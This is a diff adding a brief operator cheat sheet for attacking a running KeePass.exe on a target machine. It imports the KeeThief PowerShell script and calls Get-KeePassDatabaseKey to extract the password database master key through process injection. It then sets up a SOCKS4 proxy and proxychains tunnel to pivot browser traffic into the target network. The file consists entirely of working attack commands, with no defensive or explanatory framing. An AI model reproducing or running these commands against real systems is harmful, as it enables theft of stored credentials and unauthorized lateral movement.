@@ -1,0 +1,16 @@
+# Attack KeePass.exe running in the target system #
+# SeDebugPriviledge is disabled???
+powershell-import /path/to/KeeThief-master/Powershell/KeeThief.ps1 # https://github.com/HarmJ0y/KeeThief
+
+powerpick Get-KeePassDatabaseKey -Verbose #need to inject to the process and run another session to get it worked
+
+# start a socks4a
+socks 8080
+
+# tunneling
+View > Proxy Pivots > setg Proxies socks4:IP:8080
+
+# edit /etc/proxychains.conf
+socks4 IP 8080
+
+proxychains firefox 
